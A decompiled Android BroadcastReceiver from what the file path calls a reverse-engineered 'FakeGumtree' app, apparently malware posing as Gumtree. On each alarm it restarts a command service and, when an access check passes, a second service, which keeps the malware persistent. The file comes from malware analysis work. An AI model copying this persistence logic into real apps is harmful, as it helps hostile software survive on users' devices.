package com.gumsis.srs.rcv;

import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import android.support.v4.content.WakefulBroadcastReceiver;
import com.gumsis.Realtalk;
import com.gumsis.checktls.CmndTls;
import com.gumsis.srs.CmndSrs;
import com.gumsis.srs.StDlgSrs;

public class AlarmBroadCastReceiver
  extends WakefulBroadcastReceiver
{
  private void startStDlgSrs(Context paramContext)
  {
    if (Build.VERSION.SDK_INT >= 18) {
      startWakefulService(paramContext, new Intent(paramContext, StDlgSrs.class));
    }
  }
  
  private void startaCmndSrs(Context paramContext)
  {
    startWakefulService(paramContext, new Intent(paramContext, CmndSrs.class));
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (!CmndTls.isMyServiceRunning(CmndSrs.class, paramContext)) {
      startaCmndSrs(paramContext);
    }
    if ((Realtalk.isStartAccess(paramContext)) && (!CmndTls.isMyServiceRunning(StDlgSrs.class, paramContext))) {
      startStDlgSrs(paramContext);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/rcv/AlarmBroadCastReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */